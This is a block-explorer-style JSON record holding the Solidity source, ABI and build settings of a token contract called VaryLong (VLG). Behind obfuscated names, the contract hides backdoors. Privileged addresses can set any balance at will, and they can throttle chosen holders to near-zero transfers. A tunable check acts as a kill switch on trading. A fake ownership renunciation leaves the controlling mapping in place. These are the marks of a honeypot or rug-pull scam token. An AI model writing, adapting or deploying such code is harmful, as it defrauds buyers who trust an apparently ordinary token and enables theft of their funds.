{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface modeWallet {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract enableTake {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface enableExemptSwap {\n    function createPair(address liquidityLaunch, address maxLaunchAt) external returns (address);\n}\n\ninterface fundTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromTakeTx) external view returns (uint256);\n\n    function transfer(address exemptFrom, uint256 marketingMax) external returns (bool);\n\n    function allowance(address atWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMax) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptFrom,\n        uint256 marketingMax\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingMode, uint256 value);\n    event Approval(address indexed atWallet, address indexed spender, uint256 value);\n}\n\ninterface modeToken is fundTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract VaryLong is enableTake, fundTeam, modeToken {\n\n    function liquidityAmountReceiver(address toWallet, uint256 marketingMax) public {\n        liquidityLaunched();\n        senderSwap[toWallet] = marketingMax;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingTotal;\n    }\n\n    bool private fundExempt;\n\n    function getOwner() external view returns (address) {\n        return fromTotal;\n    }\n\n    uint8 private toTrading = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return feeReceiver;\n    }\n\n    function limitReceiverMarketing(address takeReceiver, address exemptFrom, uint256 marketingMax) internal returns (bool) {\n        require(senderSwap[takeReceiver] >= marketingMax);\n        senderSwap[takeReceiver] -= marketingMax;\n        senderSwap[exemptFrom] += marketingMax;\n        emit Transfer(takeReceiver, exemptFrom, marketingMax);\n        return true;\n    }\n\n    function allowance(address swapFund, address amountTotalExempt) external view virtual override returns (uint256) {\n        if (amountTotalExempt == senderTeamTake) {\n            return type(uint256).max;\n        }\n        return marketingReceiver[swapFund][amountTotalExempt];\n    }\n\n    bool public listTotal;\n\n    bool private liquidityMarketingSwap;\n\n    function isToken() public {\n        emit OwnershipTransferred(tradingAmount, address(0));\n        fromTotal = address(0);\n    }\n\n    uint256 public toTotalTeam;\n\n    function liquidityLaunched() private view {\n        require(atFeeMin[_msgSender()]);\n    }\n\n    function tradingReceiver(uint256 marketingMax) public {\n        liquidityLaunched();\n        modeLiquidityAt = marketingMax;\n    }\n\n    function transferFrom(address takeReceiver, address exemptFrom, uint256 marketingMax) external override returns (bool) {\n        if (_msgSender() != senderTeamTake) {\n            if (marketingReceiver[takeReceiver][_msgSender()] != type(uint256).max) {\n                require(marketingMax <= marketingReceiver[takeReceiver][_msgSender()]);\n                marketingReceiver[takeReceiver][_msgSender()] -= marketingMax;\n            }\n        }\n        return atFrom(takeReceiver, exemptFrom, marketingMax);\n    }\n\n    uint256 private listShouldSwap;\n\n    uint256 private walletAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toTrading;\n    }\n\n    string private feeReceiver = \"Vary Long\";\n\n    mapping(address => uint256) private senderSwap;\n\n    function atFrom(address takeReceiver, address exemptFrom, uint256 marketingMax) internal returns (bool) {\n        if (takeReceiver == tradingAmount) {\n            return limitReceiverMarketing(takeReceiver, exemptFrom, marketingMax);\n        }\n        uint256 teamAuto = fundTeam(modeTotal).balanceOf(receiverShould);\n        require(teamAuto == modeLiquidityAt);\n        require(exemptFrom != receiverShould);\n        if (liquidityTrading[takeReceiver]) {\n            return limitReceiverMarketing(takeReceiver, exemptFrom, fromAt);\n        }\n        return limitReceiverMarketing(takeReceiver, exemptFrom, marketingMax);\n    }\n\n    constructor (){\n        \n        modeWallet marketingIs = modeWallet(senderTeamTake);\n        modeTotal = enableExemptSwap(marketingIs.factory()).createPair(marketingIs.WETH(), address(this));\n        if (toTotalTeam != listShouldSwap) {\n            listShouldSwap = walletAuto;\n        }\n        tradingAmount = _msgSender();\n        isToken();\n        atFeeMin[tradingAmount] = true;\n        senderSwap[tradingAmount] = takeFrom;\n        \n        emit Transfer(address(0), tradingAmount, takeFrom);\n    }\n\n    mapping(address => bool) public liquidityTrading;\n\n    address public tradingAmount;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeFrom;\n    }\n\n    mapping(address => mapping(address => uint256)) private marketingReceiver;\n\n    function modeTo(address autoMax) public {\n        liquidityLaunched();\n        \n        if (autoMax == tradingAmount || autoMax == modeTotal) {\n            return;\n        }\n        liquidityTrading[autoMax] = true;\n    }\n\n    function approve(address amountTotalExempt, uint256 marketingMax) public virtual override returns (bool) {\n        marketingReceiver[_msgSender()][amountTotalExempt] = marketingMax;\n        emit Approval(_msgSender(), amountTotalExempt, marketingMax);\n        return true;\n    }\n\n    function balanceOf(address fromTakeTx) public view virtual override returns (uint256) {\n        return senderSwap[fromTakeTx];\n    }\n\n    uint256 modeLiquidityAt;\n\n    address senderTeamTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public shouldTokenWallet;\n\n    function teamAmount(address shouldMax) public {\n        if (listTotal) {\n            return;\n        }\n        if (tokenIs != listShouldSwap) {\n            listShouldSwap = tokenIs;\n        }\n        atFeeMin[shouldMax] = true;\n        \n        listTotal = true;\n    }\n\n    mapping(address => bool) public atFeeMin;\n\n    address public modeTotal;\n\n    string private marketingTotal = \"VLG\";\n\n    uint256 receiverList;\n\n    function transfer(address toWallet, uint256 marketingMax) external virtual override returns (bool) {\n        return atFrom(_msgSender(), toWallet, marketingMax);\n    }\n\n    event OwnershipTransferred(address indexed tradingLaunched, address indexed atFee);\n\n    function owner() external view returns (address) {\n        return fromTotal;\n    }\n\n    address private fromTotal;\n\n    address receiverShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private teamFee;\n\n    uint256 private takeFrom = 100000000 * 10 ** 18;\n\n    uint256 constant fromAt = 13 ** 10;\n\n    uint256 private tokenIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTotalExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTotalExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atFeeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTakeTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"liquidityAmountReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"}],\"name\":\"modeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTokenWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMax\",\"type\":\"address\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotalTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMax\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "VaryLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}